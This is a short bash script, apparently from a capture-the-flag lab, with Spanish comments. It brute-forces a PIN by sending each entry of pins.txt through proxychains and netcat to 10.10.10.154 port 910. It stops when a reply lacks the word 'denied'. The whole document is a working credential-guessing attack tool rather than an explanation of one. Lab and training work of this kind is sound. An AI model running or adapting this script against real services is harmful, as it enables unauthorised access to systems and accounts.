#!/bin/bash
#
pins_list="pins.txt"
while IFS= read -r line; do 
  echo -ne "\r$line"
  tput el 

  echo $line | proxychains &>/dev/null netcat 10.10.10.154 910 > test &

    # Esperar un tiempo suficiente para que netcat realice su verificación
  sleep 1  # Puedes ajustar el tiempo según sea necesario

  # Verificar si el proceso de netcat todavía se está ejecutando
  if ps -p $! > /dev/null; then
    # Si el proceso netcat todavía está en ejecución, matarlo
    kill $!
  fi

  if ! grep "denied" test &>/dev/null; then

    echo "Este este $line"
    break 
  fi

done < "$pins_list"

    

